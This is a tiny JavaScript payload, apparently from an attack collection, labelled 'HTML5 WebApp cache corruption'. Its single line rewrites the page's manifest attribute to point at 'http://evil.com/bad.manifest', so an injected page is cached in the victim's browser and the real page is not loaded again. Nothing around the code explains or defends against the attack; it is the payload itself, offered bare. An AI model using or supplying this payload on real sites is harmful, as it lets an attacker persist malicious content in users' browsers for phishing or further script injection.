/* HTML5 WebApp cache corruption            */
/* bad.manifest specifies the injected page */
/* not to be loaded again                   */

document.getElementsByTagName("html")[0].setAttribute("manifest","http://evil.com/bad.manifest");

